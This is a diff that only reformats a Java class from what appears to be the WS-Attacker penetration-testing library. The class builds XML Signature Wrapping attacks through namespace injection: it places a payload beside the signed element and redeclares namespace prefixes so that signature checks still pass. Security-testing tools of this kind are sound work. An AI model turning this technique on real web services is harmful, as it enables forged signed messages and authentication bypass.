@@ -36,50 +36,65 @@ import wsattacker.library.signatureWrapping.xpath.weakness.util.XPathWeaknessToo
 /**
  * NamespaceInection attack.
  */
-public class XPathNamespaceInjectionWeakness implements XPathWeaknessInterface {
+public class XPathNamespaceInjectionWeakness
+    implements XPathWeaknessInterface
+{
 
     int numberOfSubtrees;
+
     int numberOfPossibleNamspacedeclarationPositions;
+
     Step step;
+
     XPathElement ref;
 
-    public XPathNamespaceInjectionWeakness(XPathElement ref,
-      Step step,
-      SignedElement signedElement,
-      PayloadElement payloadElement)
-      throws InvalidWeaknessException {
+    public XPathNamespaceInjectionWeakness( XPathElement ref, Step step, SignedElement signedElement,
+                                            PayloadElement payloadElement )
+        throws InvalidWeaknessException
+    {
         this.step = step;
         this.ref = ref;
 
-        if (step.getPreviousStep() == null) {
-            throw new InvalidWeaknessException("Namespace injection does not work on first step");
+        if ( step.getPreviousStep() == null )
+        {
+            throw new InvalidWeaknessException( "Namespace injection does not work on first step" );
         }
 
-        if (step.getNextStep() == null) {
-            throw new InvalidWeaknessException("Namespace injection does not work on last step");
+        if ( step.getNextStep() == null )
+        {
+            throw new InvalidWeaknessException( "Namespace injection does not work on last step" );
         }
 
         String prefix = step.getAxisSpecifier().getNodeName().getPrefix();
-        if (prefix.isEmpty()) {
-            throw new InvalidWeaknessException("No Prefix in this Step");
+        if ( prefix.isEmpty() )
+        {
+            throw new InvalidWeaknessException( "No Prefix in this Step" );
         }
 
-        if (prefix.equals(signedElement.getSignedElement().getPrefix())) {
-            throw new InvalidWeaknessException("Namespace injection technique requires the signed Element to have a different namespace than the injected one.");
+        if ( prefix.equals( signedElement.getSignedElement().getPrefix() ) )
+        {
+            throw new InvalidWeaknessException(
+                                                "Namespace injection technique requires the signed Element to have a different namespace than the injected one." );
         }
 
         // Detect if exclusive canonicalization method is used
         // only in this case the namespace injection attack works
-        // TODO: This should now go better by using SignedElement.class.getReferringElement()
+        // TODO: This should now go better by using
+        // SignedElement.class.getReferringElement()
         boolean exclusive = false;
         Node node = ref.getXPathElement();
-        while (node.getNodeType() == Node.ELEMENT_NODE) {
-            if (node.getLocalName().equals("SignedInfo") && node.getNamespaceURI().equals(NamespaceConstants.URI_NS_DS)) {
-                List<Element> canonList = DomUtilities
-                  .findChildren(node, "CanonicalizationMethod", NamespaceConstants.URI_NS_DS);
-                for (Element canon : canonList) {
-                    if (CanonicalizationMethod.EXCLUSIVE.equals(canon.getAttribute("Algorithm")) || CanonicalizationMethod.EXCLUSIVE_WITH_COMMENTS
-                      .equals(canon.getAttribute("Algorithm"))) {
+        while ( node.getNodeType() == Node.ELEMENT_NODE )
+        {
+            if ( node.getLocalName().equals( "SignedInfo" )
+                && node.getNamespaceURI().equals( NamespaceConstants.URI_NS_DS ) )
+            {
+                List<Element> canonList =
+                    DomUtilities.findChildren( node, "CanonicalizationMethod", NamespaceConstants.URI_NS_DS );
+                for ( Element canon : canonList )
+                {
+                    if ( CanonicalizationMethod.EXCLUSIVE.equals( canon.getAttribute( "Algorithm" ) )
+                        || CanonicalizationMethod.EXCLUSIVE_WITH_COMMENTS.equals( canon.getAttribute( "Algorithm" ) ) )
+                    {
                         exclusive = true;
                         break;
                     }
@@ -87,75 +102,76 @@ public class XPathNamespaceInjectionWeakness implements XPathWeaknessInterface {
             }
             node = node.getParentNode();
         }
-        if (!exclusive) {
-            throw new InvalidWeaknessException("No exclusve c14n used!");
+        if ( !exclusive )
+        {
+            throw new InvalidWeaknessException( "No exclusve c14n used!" );
         }
 
-        this.numberOfSubtrees = XPathWeaknessTools.getSignedPostPart(step, signedElement.getSignedElement()).size();
+        this.numberOfSubtrees = XPathWeaknessTools.getSignedPostPart( step, signedElement.getSignedElement() ).size();
 
         numberOfPossibleNamspacedeclarationPositions = 0;
         node = ref.getXPathElement();
-        while (node.getNodeType() == Node.ELEMENT_NODE) {
+        while ( node.getNodeType() == Node.ELEMENT_NODE )
+        {
             ++numberOfPossibleNamspacedeclarationPositions;
             node = node.getParentNode();
         }
 
-        if (getNumberOfPossibilities() == 0) {
-            throw new InvalidWeaknessException("XPath does not match any Elements.");
+        if ( getNumberOfPossibilities() == 0 )
+        {
+            throw new InvalidWeaknessException( "XPath does not match any Elements." );
         }
     }
 
     @Override
-    public int getNumberOfPossibilities() {
+    public int getNumberOfPossibilities()
+    {
         // 2 possibilites: before and after original Element
         return 2 * numberOfSubtrees * numberOfPossibleNamspacedeclarationPositions;
     }
 
     @Override
-    public void abuseWeakness(int index,
-      SignedElement signedElement,
-      PayloadElement payloadElement)
-      throws InvalidWeaknessException {
-        boolean before = (index % 2) == 0;
+    public void abuseWeakness( int index, SignedElement signedElement, PayloadElement payloadElement )
+        throws InvalidWeaknessException
+    {
+        boolean before = ( index % 2 ) == 0;
         index /= 2;
         int elementIndex = index % numberOfSubtrees;
         index /= numberOfSubtrees;
         int declarationPosition = index % numberOfPossibleNamspacedeclarationPositions;
 
-        abuseWeakness(before, elementIndex, declarationPosition, signedElement.getSignedElement(), payloadElement.getPayloadElement());
+        abuseWeakness( before, elementIndex, declarationPosition, signedElement.getSignedElement(),
+                       payloadElement.getPayloadElement() );
     }
 
     /**
      * Performs a namespace injection attack.
-     *
-     * @param before
-     *                            : Should the payload be placed before or after the signed part?
-     * @param elementIndex
-     *                            : Commonly, this is 0. Only if the XPath matches multiple Elements, this
-     *                            can be used.
-     * @param declarationPosition
-     *                            : Where to declare the xmlns:orgPrefix=attacker-uri
+     * 
+     * @param before : Should the payload be placed before or after the signed part?
+     * @param elementIndex : Commonly, this is 0. Only if the XPath matches multiple Elements, this can be used.
+     * @param declarationPosition : Where to declare the xmlns:orgPrefix=attacker-uri
      * @param signedElement
      * @param payloadElement
-     *
      * @throws InvalidWeaknessException
      */
-    private void abuseWeakness(boolean before,
-      int elementIndex,
-      int declarationPosition,
-      Element signedElement,
-      Element payloadElement)
-      throws InvalidWeaknessException {
-        List<Element> matches = XPathWeaknessTools.getSignedPostPart(step, signedElement);
-        Element signedPostPart = matches.get(elementIndex);
-        Element payloadPostPart = XPathWeaknessTools.createPayloadPostPart(signedPostPart, signedElement, payloadElement);
+    private void abuseWeakness( boolean before, int elementIndex, int declarationPosition, Element signedElement,
+                                Element payloadElement )
+        throws InvalidWeaknessException
+    {
+        List<Element> matches = XPathWeaknessTools.getSignedPostPart( step, signedElement );
+        Element signedPostPart = matches.get( elementIndex );
+        Element payloadPostPart =
+            XPathWeaknessTools.createPayloadPostPart( signedPostPart, signedElement, payloadElement );
 
-        if (before) {
-            WeaknessLog.append("Inserted Payload just before " + signedPostPart.getNodeName());
-            signedPostPart.getParentNode().insertBefore(payloadPostPart, signedPostPart);
-        } else {
-            WeaknessLog.append("Inserted Payload after " + signedPostPart.getNodeName());
-            signedPostPart.getParentNode().appendChild(payloadPostPart);
+        if ( before )
+        {
+            WeaknessLog.append( "Inserted Payload just before " + signedPostPart.getNodeName() );
+            signedPostPart.getParentNode().insertBefore( payloadPostPart, signedPostPart );
+        }
+        else
+        {
+            WeaknessLog.append( "Inserted Payload after " + signedPostPart.getNodeName() );
+            signedPostPart.getParentNode().appendChild( payloadPostPart );
         }
 
         String theNamespaceUri = signedPostPart.getNamespaceURI();
@@ -165,26 +181,30 @@ public class XPathNamespaceInjectionWeakness implements XPathWeaknessInterface {
         String injectedNamespaceUri = NamespaceConstants.URI_NS_WSATTACKER;
 
         // change prefix namespace uri of signed post part and its descandants
-        List<Element> taskList = DomUtilities.findChildren(signedPostPart, null, theNamespaceUri);
-        taskList.add(0, signedPostPart);
-        for (Element task : taskList) {
-            if (task.getPrefix().equals(thePrefix) && task.getNamespaceURI().equals(theNamespaceUri)) {
-                task.getOwnerDocument().renameNode(task, injectedNamespaceUri, injectedPrefix + ":" + task.getLocalName());
-                WeaknessLog.append(String.format("Renamed %s:%s to {%s}%s", thePrefix, task.getLocalName(), task
-                  .getNamespaceURI(), task.getNodeName()));
+        List<Element> taskList = DomUtilities.findChildren( signedPostPart, null, theNamespaceUri );
+        taskList.add( 0, signedPostPart );
+        for ( Element task : taskList )
+        {
+            if ( task.getPrefix().equals( thePrefix ) && task.getNamespaceURI().equals( theNamespaceUri ) )
+            {
+                task.getOwnerDocument().renameNode( task, injectedNamespaceUri,
+                                                    injectedPrefix + ":" + task.getLocalName() );
+                WeaknessLog.append( String.format( "Renamed %s:%s to {%s}%s", thePrefix, task.getLocalName(),
+                                                   task.getNamespaceURI(), task.getNodeName() ) );
             }
         }
 
         // add new prefix so that xpath element can see it
-        Element declarationElement = DomUtilities.findCorrespondingElement(signedElement.getOwnerDocument(), ref
-          .getXPathElement());
-        for (int i = 1; i < declarationPosition; ++i) {
+        Element declarationElement =
+            DomUtilities.findCorrespondingElement( signedElement.getOwnerDocument(), ref.getXPathElement() );
+        for ( int i = 1; i < declarationPosition; ++i )
+        {
             // go up
             declarationElement = (Element) declarationElement.getParentNode();
         }
-        declarationElement.setAttribute("xmlns:" + thePrefix, injectedNamespaceUri);
-        WeaknessLog.append(String.format("Changed namespace declaration in <%s> to %s -> %s", declarationElement
-          .getNodeName(), thePrefix, injectedNamespaceUri));
+        declarationElement.setAttribute( "xmlns:" + thePrefix, injectedNamespaceUri );
+        WeaknessLog.append( String.format( "Changed namespace declaration in <%s> to %s -> %s",
+                                           declarationElement.getNodeName(), thePrefix, injectedNamespaceUri ) );
 
     }
 
